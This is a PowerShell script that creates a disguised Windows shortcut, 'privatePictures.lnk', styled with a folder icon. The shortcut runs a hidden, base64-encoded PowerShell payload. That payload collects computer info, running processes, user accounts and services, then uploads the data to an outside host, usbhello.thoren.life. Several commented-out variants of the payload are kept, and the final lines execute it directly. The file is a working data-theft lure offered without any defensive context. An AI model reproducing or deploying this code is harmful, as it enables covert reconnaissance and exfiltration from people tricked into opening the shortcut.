
# $payload = "IEX ((New-Object Net.WebClient).UploadString('http://usbhello.thoren.life:41295/', 'POST', $EncodedData))"


# $payload = 'iex ("iex ($data = iex(`'Get-ComputerInfo | Out-String; tasklist | Out-String; net user | Out-String; Get-Service | Out-String`'); $EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));(New-Object Net.WebClient).UploadString("http://usbhello.thoren.life:41295/", "POST", $EncodedData)")'

# $test = 'echo "Hello World!";echo ``'asd``';echo "lol"'

# $enumCommands = 'Get-ComputerInfo | Out-String; tasklist | Out-String; net user | Out-String; Get-Service | Out-String'

# $payload = 'iex (`'iex ($data = iex(`"Get-ComputerInfo | Out-String; tasklist | Out-String; net user | Out-String; Get-Service | Out-String`"); $EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));(New-Object Net.WebClient).UploadString("http://usbhello.thoren.life:41295/", "POST", $EncodedData)`')'

$payload = 'iex (`"iex ($data = iex("Get-ComputerInfo | Out-String; tasklist | Out-String; net user | Out-String; Get-Service | Out-String"); $EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));(New-Object Net.WebClient).UploadString(`"http://usbhello.thoren.life:41295/`", `"POST`", $EncodedData)`")'


# Encode payload to base64
$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

# Create shortcut
$path=".\privatePictures.lnk"
$wshell = New-Object -ComObject Wscript.Shell
$shortcut = $wshell.CreateShortcut($path)

# Set the icon to 115, ref. https://renenyffenegger.ch/development/Windows/PowerShell/examples/WinAPI/ExtractIconEx/shell32.html
$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,115"

$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-nop -w hidden -enc $ENCODED"
$shortcut.WorkingDirectory = "C:"
$shortcut.Description = "Hello there, nice to see you"

# Hide the window
$shortcut.WindowStyle = 7

$shortcut.Save()


powershell.exe -nop -w hidden -enc $ENCODED
powershell.exe -nop -enc $ENCODED